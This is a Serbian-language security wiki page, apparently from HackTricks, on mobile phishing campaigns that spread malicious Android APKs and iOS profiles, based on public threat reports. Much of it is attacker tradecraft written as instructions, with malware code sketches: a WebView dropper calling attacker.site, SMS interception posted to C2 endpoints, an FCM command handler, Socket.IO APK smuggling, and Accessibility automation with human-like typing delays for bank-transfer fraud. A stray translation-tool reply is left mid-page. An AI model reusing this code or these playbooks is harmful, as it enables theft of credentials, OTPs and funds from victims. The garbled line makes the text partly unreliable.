# Mobile Phishing & Distribucija zlonamernih aplikacija (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Ova stranica obuhvata tehnike koje koriste napadači za distribuciju **malicious Android APKs** i **iOS mobile-configuration profiles** putem phishinga (SEO, social engineering, lažne prodavnice, aplikacije za upoznavanje, itd.).
> Materijal je prilagođen iz kampanje SarangTrap otkrivene od strane Zimperium zLabs (2025) i drugih javnih istraživanja.

## Tok napada

1. **SEO/Phishing infrastruktura**
* Registrujte desetine sličnih domena (aplikacije za upoznavanje, deljenje u cloudu, servis za automobile…).
– Koristite ključne reči na lokalnom jeziku i emojije u `<title>` elementu da biste se rangirali na Google.
– Hostujte oba Android (`.apk`) i iOS uputstva za instalaciju na istoj odredišnoj stranici.
2. **Preuzimanje prve faze**
* Android: direktan link do *unsigned* ili „third-party store“ APK-a.
* iOS: `itms-services://` ili običan HTTPS link do zlonamernog **mobileconfig** profila (vidi dole).
3. **Post-install Social Engineering**
* Pri prvom pokretanju aplikacija traži **pozivni / verifikacioni kod** (iluzija ekskluzivnog pristupa).
* Kod se **POSTuje preko HTTP-a** na Command-and-Control (C2).
* C2 odgovara `{"success":true}` ➜ malware nastavlja.
* Sandbox / AV dinamička analiza koja nikada ne pošalje validan kod ne uoči **zlonamerno ponašanje** (evasion).
4. **Zloupotreba runtime dozvola (Android)**
* Opasne dozvole se traže tek **nakon pozitivnog odgovora C2**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Novije varijante **uklanjaju `<uses-permission>` za SMS iz `AndroidManifest.xml`** ali ostavljaju Java/Kotlin kod koji čita SMS preko reflection ⇒ smanjuje statički skor dok i dalje funkcioniše na uređajima koji dodeljuju dozvolu preko `AppOps` zloupotrebe ili starih ciljeva.
5. **Fasadni UI & prikupljanje u pozadini**
* Aplikacija prikazuje bezopasne prikaze (SMS viewer, gallery picker) implementirane lokalno.
* U međuvremenu exfiltrira:
- IMEI / IMSI, broj telefona
- Potpuni `ContactsContract` dump (JSON niz)
- JPEG/PNG iz `/sdcard/DCIM` kompresovan sa [Luban](https://github.com/Curzibn/Luban) radi smanjenja veličine
- Opcionalno SMS sadržaj (`content://sms`)
Payloads su **batch-zipped** i šalju se putem `HTTP POST /upload.php`.
6. **iOS metoda isporuke**
* Jedan **mobile-configuration profile** može zatražiti `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` itd. kako bi upisao/registrovao uređaj u nadzor sličan “MDM”.
* Uputstva za social-engineering:
1. Otvorite Settings ➜ *Profile downloaded*.
2. Tapnite *Install* tri puta (screenshot-i na phishing stranici).
3. Trust-ujte nepotpisani profil ➜ napadač dobija *Contacts* i *Photo* entitlement bez App Store revizije.
7. **Mrežni sloj**
* Obični HTTP, često na portu 80 sa HOST headerom kao `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (bez TLS → lako za uočiti).

## Red-Team saveti

* **Dynamic Analysis Bypass** – Tokom procene malware-a, automatizujte fazu pozivnog koda pomoću Frida/Objection da biste dostigli zlonamerni branch.
* **Manifest vs. Runtime Diff** – Uporedite `aapt dump permissions` sa runtime `PackageManager#getRequestedPermissions()`; nedostatak opasnih dozvola je crvena zastavica.
* **Network Canary** – Konfigurišite `iptables -p tcp --dport 80 -j NFQUEUE` da biste detektovali neobične nagle POST zahteve nakon unosa koda.
* **mobileconfig Inspection** – Koristite `security cms -D -i profile.mobileconfig` na macOS da izlistate `PayloadContent` i uočite prekomerne entitlements.

## Koristan Frida snippet: automatsko zaobilaženje pozivnog koda

<details>
<summary>Frida: automatsko zaobilaženje pozivnog koda</summary>
```javascript
// frida -U -f com.badapp.android -l bypass.js --no-pause
// Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
</details>

## Indikatori (generički)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

Ovaj obrazac je primećen u kampanjama koje zloupotrebljavaju teme državnih pogodnosti kako bi ukrale indijske UPI kredencijale i OTP-ove. Operateri povezuju ugledne platforme radi isporuke i otpornosti.

### Lanac isporuke preko pouzdanih platformi
- YouTube video-mamac → opis sadrži skraćeni link
- Skraćeni link → GitHub Pages phishing site koji imituje pravi portal
- Isti GitHub repo hostuje APK sa lažnom “Google Play” oznakom koja linkuje direktno na fajl
- Dinamične phishing stranice žive na Replit; kanal za udaljene komande koristi Firebase Cloud Messaging (FCM)

### Dropper sa ugrađenim payloadom i offline instalacijom
- Prvi APK je installer (dropper) koji isporučuje stvarni malware u `assets/app.apk` i traži od korisnika da isključi Wi‑Fi/mobile data kako bi umanjio cloud detection.
- Ugrađeni payload se instalira pod bezazlenim nazivom (npr. “Secure Update”). Nakon instalacije, i installer i payload su prisutni kao odvojene aplikacije.

Static triage tip (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Dynamic endpoint discovery via shortlink
- Malware preuzima plain-text, komama razdvojenu listu aktivnih endpoints sa shortlinka; jednostavne transformacije stringova proizvode krajnji phishing page path.

Example (sanitised):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudokod:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### Sakupljanje UPI kredencijala zasnovano na WebView
- Korak “Make payment of ₹1 / UPI‑Lite” učitava napadačev HTML formular sa dinamičkog endpointa unutar WebView-a i beleži osetljiva polja (telefon, banka, UPI PIN) koja se `POST`uju na `addup.php`.

Minimal loader:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Samopropagacija i presretanje SMS/OTP
- Prilikom prvog pokretanja zahtevaju se agresivne dozvole:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Kontakti se u petlji koriste za masovno slanje smishing SMS-ova sa uređaja žrtve.
- Dolazni SMS se presreću pomoću broadcast receiver-a i otpremaju zajedno sa metapodacima (sender, body, SIM slot, per-device random ID) na `/addsm.php`.

Skica receiver-a:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) kao otporan C2
- Payload se registruje na FCM; push poruke sadrže `_type` polje koje se koristi kao prekidač za pokretanje akcija (npr. ažuriranje phishing tekstualnih šablona, prebacivanje ponašanja).

Example FCM payload:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Skica Handlera:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Indikatori/IOCs
- APK sadrži sekundarni payload u `assets/app.apk`
- WebView učitava payment iz `gate.htm` i eksfiltrira na `/addup.php`
- SMS eksfiltracija na `/addsm.php`
- Preuzimanje konfiguracije preko shortlink-a (npr. `rebrand.ly/*`) koje vraća CSV endpoints
- Aplikacije označene kao generičke “Update/Secure Update”
- FCM `data` poruke sa `_type` discriminator-om u nepouzdanim aplikacijama

---

## Socket.IO/WebSocket zasnovan APK Smuggling i lažne Google Play stranice

Napadači sve češće zamenjuju statične APK linkove Socket.IO/WebSocket kanalom ugrađenim u mamce koji liče na Google Play. Ovo skriva URL payload-a, zaobilazi filtere URL/ekstenzija i održava realističan UX instalacije.

Tipičan tok klijenta zabeležen u prirodi:

<details>
<summary>Socket.IO lažni Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Zašto zaobilazi jednostavne kontrole:
- Nije izložen statički APK URL; payload se rekonstruiše u memoriji iz WebSocket frames.
- URL/MIME/extension filteri koji blokiraju direktne .apk odgovore mogu propustiti binarne podatke tunelovane preko WebSockets/Socket.IO.
- Crawlers i URL sandboxes koji ne izvršavaju WebSockets neće preuzeti payload.

Pogledajte i WebSocket tradecraft i tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – RatOn studija slučaja

Kampanja RatOn banker/RAT (ThreatFabric) je konkretan primer kako moderne mobile phishing operacije kombinuju WebView droppere, Accessibility-driven UI automation, overlays/ransom, Device Admin coercion, Automated Transfer System (ATS), crypto wallet takeover, pa čak i NFC-relay orchestration. Ovaj odeljak apstrahuje ponovo upotrebljive tehnike.

### Stage-1: WebView → native install bridge (dropper)
Napadači prikažu WebView koji pokazuje na napadačevu stranicu i ubacuju JavaScript interfejs koji izlaže native installer. Dodir na HTML dugme poziva native kod koji instalira second-stage APK smešten u assets droppera i zatim ga direktno pokreće.

Minimalni obrazac:

<details>
<summary>Stage-1 dropper minimal pattern (Java)</summary>
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
Niste priložili HTML stranice. Pošaljite sadržaj (HTML/markdown) koji treba da prevedem, pa ću uraditi prevod na srpski uz zadržavanje svih tagova i linkova.
```html
<button onclick="bridge.installApk()">Install</button>
```
Nakon instalacije, dropper pokreće payload putem explicit package/activity:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Ideja za otkrivanje: nepouzdane aplikacije koje pozivaju `addJavascriptInterface()` i izlažu metode slične installeru WebView-u; APK koji u paketu sadrži ugrađeni sekundarni payload pod `assets/` i poziva Package Installer Session API.

### Tok pristanka: Accessibility + Device Admin + naknadni runtime upiti
Stage-2 otvara WebView koji hostuje stranicu “Access”. Njen dugme poziva exportovanu metodu koja navodi žrtvu na Accessibility podešavanja i zahteva uključivanje zlonamerne usluge. Nakon odobrenja, malware koristi Accessibility da automatski klikne kroz naredne runtime dijaloge za dozvole (contacts, overlay, manage system settings, itd.) i traži Device Admin.

- Accessibility programatski pomaže prihvatiti kasnije promptove tako što pronalazi dugmad poput “Allow”/“OK” u stablu čvorova i simulira klikove.
- Provera/zahtjev overlay dozvole:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
Vidi takođe:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Overlay phishing/iznuda putem WebView
Operatori mogu izdavati komande za:
- prikazivanje overlay-a preko celog ekrana sa URL-a, ili
- prosleđivanje inline HTML koje se učitava u WebView overlay.

Moguće upotrebe: prisila (unos PIN-a), otvaranje wallet-a da bi se uhvatili PIN-ovi, poruke za iznudu. Obezbediti komandu koja proverava i traži dozvolu za overlay ako nije dodeljena.

### Remote control model – tekstualni pseudo-ekran + screen-cast
- Niska propusnost: periodično dump-ovati Accessibility node tree, serijalizovati vidljive tekstove/uloge/koordinate i poslati ih C2 kao pseudo-ekran (komande poput `txt_screen` jednom i `screen_live` kontinuirano).
- Velika vernost: zahtevati MediaProjection i pokrenuti screen-casting/snimanje na zahtev (komande kao `display` / `record`).

### ATS playbook (automacija bankovne aplikacije)
Na osnovu JSON zadatka, otvoriti bank app, upravljati UI preko Accessibility koristeći kombinaciju tekstualnih upita i tapova po koordinatama, i uneti platni PIN žrtve kada se to zatraži.

Example task:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Example texts seen in one target flow (CZ → EN):
- "Nová platba" → "Novo plaćanje"
- "Zadat platbu" → "Unesi uplatu"
- "Nový příjemce" → "Novi primalac"
- "Domácí číslo účtu" → "Domaći broj računa"
- "Další" → "Dalje"
- "Odeslat" → "Pošalji"
- "Ano, pokračovat" → "Da, nastavi"
- "Zaplatit" → "Plati"
- "Hotovo" → "Gotovo"

Operatori mogu takođe proveravati/povećavati limite prenosa putem komandi kao `check_limit` i `limit` koje na sličan način navigiraju kroz interfejs za limite.

### Crypto wallet seed extraction
Ciljevi uključuju MetaMask, Trust Wallet, Blockchain.com, Phantom. Tok: otključavanje (ukradeni PIN ili dostavljena lozinka), navigacija do Security/Recovery, otkriti/prikazati seed phrase, keylog/exfiltrate it. Implementirajte selektore osetljive na lokalizaciju (EN/RU/CZ/SK) kako biste stabilizovali navigaciju kroz jezike.

### Device Admin coercion
Device Admin APIs se koriste za povećanje mogućnosti za PIN-capture i za frustriranje žrtve:

- Neposredno zaključavanje:
```java
dpm.lockNow();
```
- Isteknite trenutni credential da biste prisilili promenu (Accessibility beleži novi PIN/password):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Primorajte otključavanje bez biometrijske autentifikacije onemogućavanjem biometrijskih funkcija keyguard-a:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Napomena: Mnogi DevicePolicyManager controls zahtevaju Device Owner/Profile Owner na novijim Android uređajima; neke OEM verzije mogu biti popustljive. Uvek verifikujte na ciljanom OS/OEM.

### Orkestracija NFC relay (NFSkate)
Stage-3 može instalirati i pokrenuti eksterni NFC-relay modul (npr. NFSkate) i čak mu proslediti HTML šablon da vodi žrtvu tokom relay-a. Ovo omogućava contactless card-present cash-out pored online ATS.

Pozadina: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Skup komandi operatora (primer)
- UI/stanje: `txt_screen`, `screen_live`, `display`, `record`
- Socijalno: `send_push`, `Facebook`, `WhatsApp`
- Overlay-i: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Novčanici: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Uređaj: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Komunikacija/izvidjanje: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Anti-detekcija ATS zasnovana na Accessibility: ljudska kadenica teksta i dvostruka injekcija teksta (Herodotus)

Napadači sve češće mešaju automatizaciju zasnovanu na Accessibility sa anti-detekcijom podešenom protiv osnovne biometrije ponašanja. Jedan noviji banker/RAT pokazuje dva komplementarna režima isporuke teksta i prekidač operatera za simulaciju ljudskog kucanja sa nasumičnom kadencom.

- Režim otkrivanja: enumeriše vidljive node-ove koristeći selectors i bounds da precizno cilja input polja (ID, text, contentDescription, hint, bounds) pre nego što deluje.
- Dvostruka injekcija teksta:
- Mod 1 – `ACTION_SET_TEXT` direktno na ciljnom node-u (stabilno, bez keyboard-a);
- Mod 2 – postavljanje clipboard-a + `ACTION_PASTE` u fokusirani node (radi kada je direktno setText blokirano).
- Ljudska kadenica: podelite string koji obezbeđuje operater i isporučite ga karakter-po-karakter sa nasumičnim kašnjenjima od 300–3000 ms između događaja da bi se izbegle heuristike „machine-speed typing“. Implementirano ili postepenim povećavanjem vrednosti putem `ACTION_SET_TEXT`, ili lepljenjem po jednom karakteru.

<details>
<summary>Java skica: node discovery + delayed per-char input via setText or clipboard+paste</summary>
```java
// Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
void discover(AccessibilityNodeInfo r, List<String> out){
if (r==null) return; Rect b=new Rect(); r.getBoundsInScreen(b);
CharSequence id=r.getViewIdResourceName(), txt=r.getText(), cd=r.getContentDescription();
out.add(String.format("cls=%s id=%s txt=%s desc=%s b=%s",
r.getClassName(), id, txt, cd, b.toShortString()));
for(int i=0;i<r.getChildCount();i++) discover(r.getChild(i), out);
}

// Mode 1: progressively set text with randomized 300–3000 ms delays
void sendTextSetText(AccessibilityNodeInfo field, String s) throws InterruptedException{
String cur = "";
for (char c: s.toCharArray()){
cur += c; Bundle b=new Bundle();
b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cur);
field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}

// Mode 2: clipboard + paste per-char with randomized delays
void sendTextPaste(AccessibilityService svc, AccessibilityNodeInfo field, String s) throws InterruptedException{
field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
ClipboardManager cm=(ClipboardManager) svc.getSystemService(Context.CLIPBOARD_SERVICE);
for (char c: s.toCharArray()){
cm.setPrimaryClip(ClipData.newPlainText("x", Character.toString(c)));
field.performAction(AccessibilityNodeInfo.ACTION_PASTE);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}
```
</details>

Overlay-i koji blokiraju za prikrivanje prevare:
- Prikazati preko celog ekrana `TYPE_ACCESSIBILITY_OVERLAY` sa opacitetom pod kontrolom operatora; držati ga neprozirnim za žrtvu dok daljinska automatizacija radi ispod.
- Tipično izložene komande: `opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.

Minimal overlay sa podesivim alpha:
```java
View v = makeOverlayView(ctx); v.setAlpha(0.92f); // 0..1
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
MATCH_PARENT, MATCH_PARENT,
WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
PixelFormat.TRANSLUCENT);
wm.addView(v, lp);
```
Primitivi kontrole operatora koji se često viđaju: `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y` (screen sharing).

## References

- [New Android Malware Herodotus Mimics Human Behaviour to Evade Detection](https://www.threatfabric.com/blogs/new-android-malware-herodotus-mimics-human-behaviour-to-evade-detection)

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)

{{#include ../../banners/hacktricks-training.md}}
